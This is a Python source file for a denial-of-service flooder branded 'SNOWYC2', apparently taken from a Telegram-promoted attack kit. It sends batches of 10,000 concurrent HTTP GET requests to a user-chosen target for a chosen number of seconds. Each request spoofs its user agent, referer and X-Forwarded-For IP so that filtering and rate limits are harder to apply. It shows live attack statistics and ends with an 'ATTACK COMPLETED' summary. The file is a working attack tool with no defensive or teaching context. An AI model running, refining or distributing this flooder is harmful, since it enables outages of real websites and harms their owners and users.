import asyncio
import aiohttp
import random
import sys
import os
import psutil
import time
from concurrent.futures import ThreadPoolExecutor

# Constants
MAX_CONCURRENT = 10000  # Further increase concurrent requests for more power
REQUEST_TIMEOUT = 10
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
]

# Function to load referers from the file
def load_referers():
    try:
        with open("refs.txt", "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return ["https://www.google.com/"]

class AttackEngine:
    def __init__(self, method, target, duration):
        self.method = method
        self.target = target
        self.duration = duration
        self.start_time = 0
        self.referers = load_referers()
        self.stats = {
            'total': 0,
            'success': 0,
            'errors': 0,
            'rps': 0,
            'peak_rps': 0
        }
        self.process = psutil.Process(os.getpid())
        self.executor = ThreadPoolExecutor(max_workers=8)  # Optimized number of workers (based on CPUs)

    # Function to make the request
    async def make_request(self, session):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Referer": random.choice(self.referers),
            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
        }

        try:
            async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT) as response:
                if response.status == 200:
                    return "SUCCESS"
                elif str(response.status).startswith('4'):
                    return "ERROR"
                return "OTHER"
        except:
            return "ERROR"

    # Function to run the attack
    async def run_attack(self):
        self.start_time = time.time()
        end_time = self.start_time + self.duration

        conn = aiohttp.TCPConnector(limit_per_host=None)
        async with aiohttp.ClientSession(connector=conn) as session:
            while time.time() < end_time:
                tasks = [self.make_request(session) for _ in range(MAX_CONCURRENT)]
                results = await asyncio.gather(*tasks)

                # Update stats
                self.stats['total'] += len(results)
                self.stats['success'] += results.count("SUCCESS")
                self.stats['errors'] += results.count("ERROR")

                # Calculate RPS and update peak RPS
                elapsed = time.time() - self.start_time
                current_rps = self.stats['total'] / elapsed if elapsed > 0 else 0
                self.stats['rps'] = current_rps
                self.stats['peak_rps'] = max(self.stats['peak_rps'], current_rps)

                self.print_status()
                await asyncio.sleep(0.55)  # Frequent stats update every 0.55 seconds

        self.print_summary()

    # Function to print status in the console
    def print_status(self):
        elapsed = time.time() - self.start_time
        remaining = max(0, self.duration - elapsed)
        ram_used_mb = self.process.memory_info().rss / 1024 / 1024

        sys.stdout.write("\033[H\033[J")  # Clear console
        print(f"\nSNOWYC2 - T.ME/STSVKINGDOM")
        print("=" * 60)
        print(f"METHOD: {self.method} | TARGET: {self.target} | TIME: {self.duration}s")
        print("=" * 60)
        print(f"REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
        print(f"RPS: {self.stats['rps']:.1f} | PEAK RPS: {self.stats['peak_rps']:.1f}")
        print(f"TIME REMAINING: {remaining:.1f}s | RAM USED: {ram_used_mb:.2f} MB")
        print("=" * 60)

    # Function to print summary at the end of attack
    def print_summary(self):
        total_time = time.time() - self.start_time
        avg_rps = self.stats['total'] / total_time if total_time > 0 else 0

        print("\nATTACK COMPLETED")
        print("=" * 60)
        print(f"TARGET: {self.target}")
        print(f"DURATION: {total_time:.1f}s")
        print(f"TOTAL REQUESTS: {self.stats['total']}")
        print(f"SUCCESS (200): {self.stats['success']}")
        print(f"ERRORS (4xx): {self.stats['errors']}")
        print(f"AVERAGE RPS: {avg_rps:.1f}")
        print("=" * 60)

# Main function
def main():
    print("\nSNOWYC2 - T.ME/STSVKINGDOM")
    print("=" * 60)

    # Input method
    method = input("METHOD: ").strip()

    target = input("TARGET: ").strip()
    if not target.startswith(('http://', 'https://')):
        target = "http://" + target

    try:
        duration = int(input("TIME (seconds): ").strip())
    except:
        print("Invalid duration.")
        return

    # Start attack engine
    engine = AttackEngine(method, target, duration)
    try:
        asyncio.run(engine.run_attack())
    except KeyboardInterrupt:
        print("\nStopped by user.")
    except Exception as e:
        print(f"\nError: {e}")

if __name__ == "__main__":
    main()
